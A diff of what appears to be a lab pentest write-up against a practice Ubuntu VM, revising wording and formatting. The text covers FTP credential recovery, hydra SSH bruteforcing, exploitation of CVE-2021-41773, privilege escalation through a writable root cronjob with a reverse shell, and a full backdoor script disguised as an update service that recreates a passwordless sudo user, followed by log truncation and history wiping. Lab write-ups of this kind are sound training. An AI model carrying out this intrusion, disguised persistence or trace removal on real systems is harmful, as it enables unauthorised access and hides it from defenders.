@@ -133,17 +133,17 @@ Let's try establishing foothold by leveraging each path individually. We have co
 
 ## Via FTP service
 ### Details
-CWE-257: Storing Passwords in a Recoverable Format
-#### Summary
-Via anonymous login, we can access to site-credentials.txt file that contains an MD5 hash of password
+`CWE-257`: Storing Passwords in a Recoverable Format
+### Summary
+Via anonymous login, we can access `site-credentials.txt` file that contains an MD5 hash for the password of `ftp-user`. 
 
-**Discovered Login**
+Discovered credentials:
 
-|Username|password|System account?|SSH enabled?|
+|Username|Password|System account?|SSH enabled?|
 |--|--|--|--|
 |`ftp-user`|`football`|yes|yes|
 
-### Walktrough
+### Walkthrough
 As we have already said, above FTP allows for anonymous login, so let's do that:
 
 ```sh
@@ -234,17 +234,17 @@ Where we can notice the presence of two interesting users: `ubuntu` and `lxd`
 
 ## Via SSH service on port 22
 ### Details
-CWE-1391: Use of Weak Credentials
-#### Summary
-Via SSH service we have tryed a bruteforce for user `ubuntu`, that is commonly used on "stock" installation of Ubuntu OS.
+`CWE-1391`: Use of Weak Credentials
+### Summary
+Via SSH service we have attempted a bruteforce for user `ubuntu`, commonly used on "stock" installation of Ubuntu OS.
 
-**Discovered Login**
+Discovered credentials:
 
-|Username|password|System account?|SSH enabled?|
+|Username|Password|System account?|SSH enabled?|
 |--|--|--|--|
 |`ubuntu`|`admin@123`|yes|yes|
 
-### Walktrough
+### Walkthrough
 Since SSH is enabled, we tried to enumerate SSH users and guess their passwords by using `hydra`, we could bruteforce both usernames and passwords in one shot by executing the following command
 
 ```sh 
@@ -274,24 +274,24 @@ ubuntu@ubuntulab:~$
 
 ## Via Apache service
 ### Details
-- CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
+- `CWE-22`: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
 - CVSS 3.0 Base score : 9.8 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
-- CVE-2021-41773
+- `CVE-2021-41773`
 - Vuln: Apache 2.4.49 < 2.4.51 Path Traversal Vulnerability
 ### Remediation
 Apache 2.4.x < 2.4.59 Multiple Vulnerabilities: Upgrade to Apache version 2.4.59 or later
 
-#### Summary
-Enumerating services, we have discovered a version of apache with multiple vulnerabilities documented. The specific configuration on this VM is vulnerable to path traversal, and thanks to that we have obtained access to a limited shell.
+### Summary
+Through services enumeration, we have discovered a version of Apache with multiple vulnerabilities documented. The specific configuration on this VM is vulnerable to path traversal, and thanks to that we have obtained access to a limited shell.
 
-### Walktrough
+### Walkthrough
 From the scanning and enumeration part we have noticed an Apache 2.4.49 webserver running. We then made a quick `nmap` scan on its port `8080` to check for inspiration in our pentesting adventure:
 
 ```sh
 ┌──(kali@kali)-[~]
 └─$ sudo nmap -sV -A 192.168.56.2 --vulners -p8080
 ```
-Many vulnerabilities show up, but a particular one caught our eye: CVE-2021-41773, which would allow remote code execution via path traversal. 
+Many vulnerabilities show up, but a particular one caught our eye: `CVE-2021-41773`, which would allow remote code execution via path traversal. 
 
 After opening a listener on any ephemeral port on our attackbox, we managed to get a shell as the user `ftp-user` by executing the following code:
 
@@ -355,9 +355,7 @@ We will show below what we've found.
 
 ## Pivoting on ubuntu user to escalate
 ### Analysis of capabilities
-When we talked about establishing foothold sia SSH, we managed to crack the password for the `ubuntu` user.
-
-Well, turns out that the aforementioned user has full root privileges.
+When we talked about establishing foothold sia SSH, we managed to crack the password for the `ubuntu` user. Turns out that the aforementioned user has full root privileges.
 
 ```sh
 ubuntu@ubuntulab:~$ sudo -l
@@ -391,10 +389,10 @@ root@test:~#
 ```
 ## Analysis of active cronjobs
 ### Details
-CWE-732: Incorrect Permission Assignment for Critical Resource
+`CWE-732`: Incorrect Permission Assignment for Critical Resource
 ### Summary
-There is an active cronjob that execute with root priviledges a file with improperly permission that allows regular user `ftp-user` to modify it. By doing it we are able to inject a reverse shell that will spawn as `root`.
-### Walktrough
+There is an active cronjob that executes with `root` privileges a file that allows regular user `ftp-user` to modify it. By doing it we are able to inject a reverse shell that will spawn as `root`.
+### Walkthrough
 By checking the `crontab` file, we noticed a particular:
 
 ```sh
@@ -425,7 +423,7 @@ Since the file is executed as root, the shell will be a root shell.
 
 
 # Persistence
-## Deploy our ssh keys
+## Deploying our SSH keys
 In order to be persistent in the machine, one of the easiest and most straightforward ways is to leverage SSH. We have generated the SSH keys in our machines:
 
 ```sh
@@ -447,33 +445,36 @@ And now we can login via `ssh` into the `root` account whenever we want (assumin
 
 It's important to note that this will work as long as the server's IP does not change. We are assuming that the server needs an exposed static IP, thus does not change. 
 
-We decided not to include other entry points for persitance because we believe that having few entry points but very stealthy ones is significantly better than having a big amount but obvious ones. Raising any kind of suspicion would trigger immediate action from the defender, who could think about doing a deeper scan on its system or even reinstalling everything from stratch on a new machine, effectively voiding all of our persistance efforts. 
+## Deploying a sudoer user as systemd service
+The idea is to create a `sudoer` user on system startup with fixed password in order to have always a persistence even if password of known users will change due to password-update policy if will be implemented by "company".
 
-This way, we are maximising the time we are persiting into the target system.
+Thus we have created a `.sh` file in a protected position with a name that seems legit
+```sh
+/usr/bin/ubuntupdates.sh
+```
+A junior sysadmin that has not implemented any IDS/IPS will leave file in `/bin`, especially if name seems related to an OS service. 
 
-## Deploying a custom user as systemd service
-The idea is to create a sudoer user on startup of system, with fixed password in order to have always a persistence even if password of known users will change due to password-update policy if will be implemented by "company".
-
-Then we have created an sh file in a "protected" position with a "legit" name. A junior sysadmin that have not implemented any IDS, will leave file in /bin, especially if name is related to OS service.
-
-`/usr/bin/ubuntupdates.sh` (the name was choosen to be "trustable")
+Here is the script in question:
 
 ```sh
 #!/bin/bash
-USERNAME="sysadmim" #typo is intended
-PASSWORD="grp0xe" # for demo purpose
+
+USERNAME="sysadmim" # typo is intended
+PASSWORD="grp0xe"   # for demo purpose
+
 if ! id "$USERNAME" &>/dev/null; then
     sudo useradd -m -s /bin/bash "$USERNAME"
     echo "$USERNAME:$PASSWORD" | sudo chpasswd
     echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/$USERNAME >/dev/null
     sudo chmod 440 /etc/sudoers.d/$USERNAME
 fi
+
 exec &>/dev/null
 ```
 ```sh
 sudo chmod +x /usr/bin/ubuntupdates.sh
 ```
-Then have created a file `ubuntupdates.service` and we have positionated ad /etc/systemd/system, that is in charge to execute file created above. 
+Then have created a file `ubuntupdates.service` and which we put in `/etc/systemd/system` that is in charge of executing the above script 
 
 ```sh
 # /etc/systemd/system/ubuntupdates.service
@@ -488,7 +489,7 @@ ExecStart=/usr/bin/ubuntupdates.sh
 [Install]
 WantedBy=multi-user.target
 ```
-Then enable it by run.
+Then enable it by executing
 
 ```sh
 sudo systemctl daemon-reload
@@ -496,20 +497,24 @@ sudo systemctl enable ubuntupdates.service
 sudo systemctl start ubuntupdates.service
 ```
 
-The by an attacker machine we have always possibility to:
+This way, from an attacker machine we have the following possibility:
 
 ```sh
-ssh sysadmim@192.68.56.4
-# pass: grp0xe
-```
-```sh
+┌──(kali@kali)-[~]
+└─$ ssh sysadmim@192.68.56.4
+        grp0xe
+
 sysadmim@ubuntulab:~$ sudo su
-root@ubuntulab:/home/sysadmim# id
-uid=0(root) gid=0(root) groups=0(root)
+root@ubuntulab:/home/sysadmim# 
 ```
 
-### Good to notice.
-User will be created if not already present, then if owner of system will detect and remove user `sysadmim` but not detect `ubuntupdates` service, the user will be recreated at next startup.
+The `sysadmim` user will be created if not already present, if the system owner removes it but not remove `ubuntupdates.service`, then it will be recreated at next startup.
+
+## Our philosophy for persistance
+
+We decided not to include other entry points for persitance because we believe that having few entry points but very stealthy ones is significantly better than having a big amount but obvious ones. Raising any kind of suspicion could trigger immediate action from the defender, who could think about doing a deeper scan on its system or even reinstalling everything from stratch on a new machine, effectively voiding all of our persistance efforts. 
+
+This way, we are maximising the time we are persiting into the target system. It would be possible to do more, but we decided to keep a low overall profile.
 
 # Clearing our traces
 The job would not be complete without a proper cleanup of our traces. 
@@ -517,7 +522,7 @@ The job would not be complete without a proper cleanup of our traces.
 ## Checking for firewall logging rules
 When we first enumerated the machine, we made some noise with `nmap`, alongside all the SSH connections we did. The first thing we thought about was checking whether there were any logging rules in `iptables`, and if so, removing them.
 
-In our case there were not.
+In our case there were not:
 
 ```sh
 root@ubuntulab:~# iptables -L
@@ -565,7 +570,7 @@ truncate -s 0 /var/log/httpd
 The most stealthy approach would be to carefully remove every time anything related to us attackers shows up in them, and subsequently restoring their respective change and access dates.
 
 ## Removing bash histories
-Finally, we remove any last trace by clearing traces on `history` from **every user** so that all the commands we issued will not be seen.
+Finally, we remove any last trace by clearing traces on `history` from every user so that all the commands we issued will not be seen.
 
 ```sh
 history -c && history -w
